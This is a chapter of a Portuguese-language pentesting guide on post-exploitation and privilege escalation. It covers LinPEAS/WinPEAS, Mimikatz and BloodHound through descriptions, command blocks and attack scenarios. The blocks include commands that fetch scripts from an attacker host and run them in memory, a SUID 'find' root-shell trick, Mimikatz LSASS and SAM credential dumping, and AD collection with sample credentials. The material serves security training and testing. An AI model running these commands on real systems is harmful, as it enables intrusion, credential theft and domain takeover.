---
description: "Técnicas e ferramentas de pós-exploração, enumeração local e escalonamento de privilégios."
---

# 6. Pós-Exploração e Escalonamento de Privilégios

Uma vez estabelecido o acesso inicial, geralmente restrito a um usuário de baixo privilégio, esta fase concentra-se na enumeração exaustiva do sistema comprometido para identificar vetores de escalonamento (*misconfigurations*, falhas de *kernel*, credenciais em cache) e no *bypass* de mecanismos de controle de acesso, com o objetivo final de obter privilégios administrativos (root/SYSTEM) e mapear a estrutura de confiança do domínio.

## 6.1 PEAS Suite (LinPEAS / WinPEAS)

* **Descrição Acadêmica/Técnica:** A PEAS Suite (*Privilege Escalation Awesome Scripts*) compreende dois *scripts* de enumeração massiva e automatizada — LinPEAS (Bash, para sistemas Unix-like) e WinPEAS (C#/.NET, para sistemas Windows) — projetados para varrer sistematicamente o sistema operacional comprometido em busca de vetores de escalonamento de privilégios. Em baixo nível, os *scripts* não exploram vulnerabilidades diretamente; em vez disso, executam centenas de verificações determinísticas e heurísticas (leitura de permissões de arquivos SUID/SGID, análise de tarefas *cron*/*Scheduled Tasks*, enumeração de capacidades do *kernel*, busca por credenciais em arquivos de configuração e histórico de *shell*, verificação de *binários* com permissões de execução elevadas) e correlacionam os achados com bancos de dados conhecidos de técnicas de escalonamento (como o GTFOBins), destacando os resultados via codificação de cores baseada em probabilidade de exploração (vermelho para altíssima probabilidade).
* **Principais Funcionalidades:**
  * Enumeração exaustiva de permissões de sistema de arquivos, capacidades (*capabilities*) e binários SUID/SGID explorávéis (Linux).
  * Varredura de credenciais em texto claro em arquivos de configuração, históricos de *shell*, variáveis de ambiente e memória de processos.
  * Identificação de versões de *kernel*/sistema operacional vulneráveis a *exploits* públicos conhecidos.
  * Análise de tarefas agendadas (*cron jobs*/*Scheduled Tasks*), serviços mal configurados e permissões de registro (WinPEAS).
  * Saída colorida e priorizada por probabilidade de exploração, facilitando a triagem rápida em ambientes com grande volume de achados.

**Sintaxe e Comandos Principais:**

```bash
# Transferência do script para a máquina alvo via servidor HTTP temporário (na máquina atacante)

python3 -m http.server 8080

# Download e execução direta em memória no alvo comprometido (Linux), sem gravação em disco

curl -s [http://IP_atacante:8080/linpeas.sh] | sh

# Execução com saída completa redirecionada para arquivo, ignorando etapas demoradas de verificação de CVEs

./linpeas.sh -a > [saida_linpeas.txt]

# Execução do equivalente Windows (via PowerShell) diretamente em memória

powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[IP_atacante]:8080/winPEAS.ps1')"
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Após obter uma *shell* reversa de baixo privilégio (www-data) em um servidor Linux através da exploração de um formulário de *upload* vulnerável, o analista precisa identificar rapidamente um caminho viável para escalonar privilégios até root, dentre as inúmeras possibilidades de má configuração em um sistema de produção real.
- **Comando Executado:**

```bash
curl -s http://10.0.5.100:8080/linpeas.sh | sh > resultado_linpeas.txt
```

- **Resultado Esperado:** O *script* executará todas as suas rotinas de verificação, e o terminal exibirá em destaque vermelho (altíssima probabilidade) uma entrada indicando que o binário `/usr/bin/find` possui a *flag* SUID habilitada. Consultando a referência do GTFOBins apontada no próprio resultado, o analista executará `find . -exec /bin/sh -p \; -quit`, obtendo uma *shell* interativa com privilégios efetivos de root instantaneamente.

## 6.2 Mimikatz

* **Descrição Acadêmica/Técnica:** O Mimikatz, desenvolvido em C por Benjamin Delpy, é uma ferramenta de extração de credenciais que opera através da manipulação direta da memória de processos do sistema Windows, especificamente do processo *Local Security Authority Subsystem Service* (LSASS). Em baixo nível, a ferramenta requer privilégios administrativos para abrir um *handle* de acesso ao processo LSASS (via chamadas à API do Windows como OpenProcess e ReadProcessMemory) e realiza a leitura e descriptografia estrutural das regiões de memória onde o sistema operacional armazena, em cache, as credenciais de sessões ativas — incluindo hashes NTLM, tíquetes Kerberos (TGT/TGS) e, em condições específicas (WDigest habilitado), senhas reversivelmente cifradas. Sua funcionalidade mais crítica, o *Pass-the-Hash* e o *Pass-the-Ticket*, permite reutilizar essas credenciais extraídas para autenticação lateral sem jamais conhecer a senha em texto claro do usuário.
* **Principais Funcionalidades:**
  * Extração de credenciais em texto claro e hashes NTLM diretamente da memória do processo LSASS (*sekurlsa::logonpasswords*).
  * Extração e manipulação de tíquetes Kerberos para ataques *Pass-the-Ticket* e forja de tíquetes (*Golden Ticket*/*Silver Ticket*).
  * *Dump* do banco de dados SAM local e do banco NTDS.dit de um *Domain Controller*, incluindo o hash *krbtgt*.
  * Bypass e desabilitação de mecanismos de proteção do sistema (ex: neutralização temporária do AMSI e do *Antivírus* em memória).
  * Manipulação de tokens de acesso (*token impersonation*) para elevação e movimentação entre contextos de segurança.

**Sintaxe e Comandos Principais:**

```bash
# Inicialização da ferramenta (requer execução em contexto administrativo local no Windows)

mimikatz.exe

# Dentro da console: elevação de privilégios para o nível de depuração necessário para acessar o LSASS

privilege::debug

# Extração de todas as credenciais em cache (senhas, hashes NTLM e tíquetes) da memória do LSASS

sekurlsa::logonpasswords

# Extração específica de tíquetes Kerberos armazenados na sessão atual

sekurlsa::tickets /export

# Dump completo do banco SAM local (hashes de contas locais)

lsadump::sam
```

**Exemplo Prático de Aplicação:**
- **Cenário:** Após escalar privilégios para administrador local em um servidor Windows através da exploração de um serviço mal configurado, o analista sabe que um administrador de domínio realizou login recentemente naquela máquina (via RDP para uma tarefa de manutenção) e busca capturar essas credenciais privilegiadas em cache para obter acesso ao *Domain Controller*.
- **Comandos Executados:**

```bash
privilege::debug

sekurlsa::logonpasswords
```

- **Resultado Esperado:** O Mimikatz listará todas as sessões de logon ativas na memória do LSASS, incluindo a sessão do administrador de domínio identificada, exibindo o nome de usuário, domínio e o hash NTLM correspondente (e, caso o WDigest esteja habilitado no sistema, a senha em texto claro). Com o hash NTLM extraído, o analista poderá autenticar-se diretamente no *Domain Controller* através de um ataque *Pass-the-Hash*, sem nunca ter conhecido a senha original.

## 6.3 BloodHound

* **Descrição Acadêmica/Técnica:** O BloodHound é uma ferramenta de análise de grafos para ambientes *Active Directory* e Azure AD, composta por um coletor de dados (*Ingestor*, tradicionalmente o SharpHound) e uma interface de visualização baseada no banco de dados orientado a grafos Neo4j. Em baixo nível, o coletor enumera exaustivamente o domínio através de consultas LDAP e chamadas de API do Windows (ex: enumeração de sessões via NetSessionEnum, permissões de ACLs via consultas ao *Security Descriptor* de objetos), mapeando relações de confiança complexas — como pertencimento a grupos, permissões delegadas, sessões de logon ativas e privilégios de acesso remoto — que são normalmente invisíveis a uma análise manual. A plataforma então aplica a teoria dos grafos para calcular algoritmicamente o *caminho de menor resistência* (*shortest path*) entre um usuário de baixo privilégio comprometido e o objetivo final (tipicamente, o grupo *Domain Admins*), revelando cadeias de ataque não intencionais decorrentes do acúmulo orgânico de permissões ao longo do tempo.
* **Principais Funcionalidades:**
  * Coleta automatizada e massiva de dados de sessões, permissões (ACLs), grupos e relações de confiança via SharpHound.
  * Visualização interativa em grafo de toda a estrutura de relacionamentos e privilégios do domínio Active Directory.
  * Cálculo algorítmico do *caminho de ataque* mais curto entre qualquer nó comprometido e um objetivo de alto privilégio (ex: Domain Admins).
  * Identificação de configurações abusáveis específicas (ex: *Kerberoasting*, delegação irrestrita, *DCSync rights*, ACLs de *GenericAll*).
  * Suporte a consultas customizadas via linguagem Cypher (nativa do Neo4j) para investigações direcionadas e complexas.

**Sintaxe e Comandos Principais:**

```bash
# Inicialização do banco de dados de grafos (pré-requisito para o BloodHound)

sudo neo4j start

# Inicialização da interface gráfica principal de análise

bloodhound

# Coleta de dados no domínio a partir de uma máquina Windows já comprometida (executando o SharpHound.exe)

SharpHound.exe -c All

# Coleta remota de dados via Python (BloodHound.py), útil quando não há execução direta em um host Windows

bloodhound-python -u [usuario] -p [senha] -d [dominio.local] -ns [IP_do_DC] -c All
```

**Exemplo Prático de Aplicação:**
- **Cenário:** O analista comprometeu a conta de um usuário de domínio padrão, sem nenhum privilégio administrativo aparente, em uma rede corporativa com centenas de usuários e grupos aninhados. Ao invés de tentar exploração manual às cegas, o objetivo é identificar programaticamente se existe algum caminho de escalonamento (por mais indireto que seja) que leve a essa conta comprometida até o grupo Domain Admins.
- **Execução Prática:** O analista executa bloodhound-python -u usuario.padrao -p 'SenhaValida123' -d alvo.local -ns 10.0.1.5 -c All para coletar os dados remotamente, e em seguida importa os arquivos JSON gerados na interface gráfica do BloodHound. Na aba de análise, seleciona o nó do usuário comprometido como nó inicial e o grupo DOMAIN ADMINS como nó final, executando a consulta pré-definida "Shortest Path to Domain Admins".
- **Resultado Esperado:** O BloodHound renderizará visualmente uma cadeia de nós conectados, revelando, por exemplo, que o usuário comprometido pertence a um grupo aninhado que possui permissão *GenericAll* sobre outro usuário, que por sua vez está habilitado para *Constrained Delegation* em um serviço com privilégios de administrador de domínio. Essa cadeia visual fornece o roteiro exato e técnico dos comandos necessários (ex: via [Mimikatz](#62-mimikatz) ou Rubeus) para escalar privilégios até o comprometimento total do domínio.
